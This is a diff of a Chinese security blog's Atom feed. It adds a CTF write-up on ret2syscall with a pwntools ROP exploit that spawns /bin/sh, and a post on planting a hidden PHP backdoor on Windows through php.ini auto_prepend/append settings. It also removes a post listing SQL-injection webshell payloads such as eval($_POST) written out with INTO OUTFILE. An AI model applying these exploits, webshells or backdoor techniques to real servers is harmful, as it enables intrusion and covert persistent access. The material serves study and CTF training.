@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://Mi1k7ea.github.com/"/>
-  <updated>2019-03-03T14:10:58.978Z</updated>
+  <updated>2019-03-03T15:51:58.121Z</updated>
   <id>https://Mi1k7ea.github.com/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>栈溢出之ret2syscall</title>
+    <link href="https://Mi1k7ea.github.com/2019/03/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/"/>
+    <id>https://Mi1k7ea.github.com/2019/03/03/栈溢出之ret2syscall/</id>
+    <published>2019-03-03T14:48:29.000Z</published>
+    <updated>2019-03-03T15:51:58.121Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p><p>关键在于——程序中存在int 0x80中断，通过该指令可以进行系统调用，其中可通过不同的系统调用号调用不同的系统调用。</p><p>一般地，我们利用如下系统调用来获取shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>当遇到32位程序时，需要使得：</p><ul><li>系统调用号，即 eax 应该为 0xb（0xb 为 execve 对应的系统调用号）</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>先运行程序查看基本功能，并file看到是静态链接文件，和libc无关：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/1.png" alt=""></p><p><img src="/2019/03/03/栈溢出之ret2syscall/2.png" alt=""></p><p>checksec发现只开启了NX：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/3.png" alt=""></p><p>打开IDA看到存在gets()即存在栈溢出风险，且IDA中给出变量v4相对于ESP和EBP的偏移分别为ESP+1Ch和EBP-64h：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/4.png" alt=""></p><p>查看String窗口，发现存在“/bin/sh”字符串：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/5.png" alt=""></p><p>当然还可以使用ROPgadget工具搜索，直接找到“/bin/sh”字符串的存储地址，记下该字符串地址为0x080be408：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/6.png" alt=""></p><p>因为是静态链接，不用看libc相关函数，而且函数太多了，直接搜索系统调用吧，记下系统调用的地址为0x08049421：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/7.png" alt=""></p><p>接着寻找pop eax~edx+ret寄存器的指令，记下符合条件的地址分别为0x080bb196和0x0806eb90：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/8.png" alt=""></p><p>至于v4变量到函数返回地址处的偏移量和前面几个题目的计算方法即结果都是一样的，这里不再多说。</p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">int_80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, pop_edx_ecx_ebx_addr, <span class="number">0</span>, <span class="number">0</span>, binsh, pop_eax_addr, <span class="number">0xb</span>, int_80_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行后getshell：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/9.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2syscall" target="_blank" rel="noopener">ret2syscall</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h2&gt;&lt;p&gt;ret2syscall，即控制程序执行系统调用，获取shell。&lt;/
+      
+    
+    </summary>
+    
+      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
+    
+    
+      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
+    
+      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    
+      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>栈溢出之ret2shellcode</title>
@@ -503,59 +532,29 @@
   </entry>
   
   <entry>
-    <title>Python安全小工具之反编译pyc文件</title>
-    <link href="https://Mi1k7ea.github.com/2019/01/01/Python%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6/"/>
-    <id>https://Mi1k7ea.github.com/2019/01/01/Python安全小工具之反编译pyc文件/</id>
+    <title>Windows下的一种PHP隐藏后门姿势</title>
+    <link href="https://Mi1k7ea.github.com/2019/01/01/Windows%E4%B8%8B%E7%9A%84%E4%B8%80%E7%A7%8DPHP%E9%9A%90%E8%94%BD%E5%90%8E%E9%97%A8%E5%A7%BF%E5%8A%BF/"/>
+    <id>https://Mi1k7ea.github.com/2019/01/01/Windows下的一种PHP隐蔽后门姿势/</id>
     <published>2018-12-31T17:01:01.000Z</published>
-    <updated>2019-02-24T05:06:48.100Z</updated>
+    <updated>2019-02-24T05:06:57.877Z</updated>
     
-    <content type="html"><![CDATA[<p>有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uncompyle6</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decompile</span><span class="params">(path)</span>:</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(path):</span><br><span class="line"><span class="keyword">for</span> parent,dirs,files <span class="keyword">in</span> os.walk(path):</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">file_name,ext = os.path.splitext(file)</span><br><span class="line"><span class="keyword">if</span> ext == <span class="string">".pyc"</span>:</span><br><span class="line">file_path = os.path.join(parent,file)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Decompiling:"</span>, file_path</span><br><span class="line">cmd = <span class="string">"uncompyle6 "</span> + file_path + <span class="string">" &gt; "</span> + parent + <span class="string">"\\"</span> + file_name + <span class="string">".py"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.system(cmd)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+]Decompile successful.\n"</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Finished."</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-]Wrong Directory Path."</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Usage: python decompile.py [Directory Path]"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">path = sys.argv[<span class="number">1</span>]</span><br><span class="line">Decompile(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果：</p><p><img src="/2019/01/01/Python安全小工具之反编译pyc文件/1.jpg" alt=""></p><p><img src="/2019/01/01/Python安全小工具之反编译pyc文件/2.jpg" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<p>在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径，则Web站点下所有的PHP文件都可以作为PHP后门。</p><p>1、修改auto_prepend_file和auto_append_file：</p><p>在php.ini中找到这两个配置项，去掉注释，添加上后门文件名，如：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/1.jpg" alt=""></p><p>2、修改include_path：</p><p>在php.ini中找到该配置项，注意是Windows版本的，去掉注释并添加后门文件所在的绝对路径，如下：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/2.jpg" alt=""></p><p>3、创建后门文件：</p><p>在include_path指示的路径上创建auto_prepend_file和auto_append_file指定文件名的两个后门文件，如下：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/3.jpg" alt=""></p><p>之后直接使用菜刀带上密码访问Web站点任意一个PHP页面即可获取shell：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/4.jpg" alt=""></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。&lt;/p&gt;
-&lt;figure class=&quot;highlight python&quot;&gt;
+        &lt;p&gt;在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径
       
     
     </summary>
     
-      <category term="Python" scheme="https://Mi1k7ea.github.com/categories/Python/"/>
+      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
     
     
-      <category term="Python" scheme="https://Mi1k7ea.github.com/tags/Python/"/>
-    
-      <category term="安全开发" scheme="https://Mi1k7ea.github.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL注入写WebShell方式小结</title>
-    <link href="https://Mi1k7ea.github.com/2019/01/01/SQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93/"/>
-    <id>https://Mi1k7ea.github.com/2019/01/01/SQL注入写WebShell方式小结/</id>
-    <published>2018-12-31T17:01:01.000Z</published>
-    <updated>2019-02-24T04:07:44.054Z</updated>
-    
-    <content type="html"><![CDATA[<p>这里小结一下通过SQL注入写入WebShell的方法。</p><p>通过SQL注入select into outfile实现，如：</p><p>1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’#</p><p>前提都是需要对目标目录具有写权限。</p><h2 id="–os-cmd-”net-user”"><a href="#–os-cmd-”net-user”" class="headerlink" title="–os-cmd=”net user”"></a>–os-cmd=”net user”</h2><p>交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径<br>下创建文件返回结果，然后再自动删除。</p><p>##–os-shell<br>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。<br>注意:关闭sqlmap文件就会被删除。</p><p>##本地写入webshell<br>先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。</p><p>注意需要最高权限。</p><p>MySQL写木马，通常可以通过phpmyadmin来实现。</p><p>前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。</p><p>1、创建一个表</p><p>CREATE TABLE a (cmd text NOT NULL);</p><p>2、插入数据</p><p>INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’);</p><p>3、导出一句话</p><p>SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’;</p><p>4、删除表</p><p>Drop TABLE IF EXISTS a;</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;这里小结一下通过SQL注入写入WebShell的方法。&lt;/p&gt;
-&lt;p&gt;通过SQL注入select into outfile实现，如：&lt;/p&gt;
-&lt;p&gt;1’ union select 1,’\&amp;lt;?php eval($_POST[a]);?&amp;gt;’ INTO OUTFIL
-      
-    
-    </summary>
-    
-      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
-    
+      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
     
       <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="SQLI" scheme="https://Mi1k7ea.github.com/tags/SQLI/"/>
     
   </entry>
   
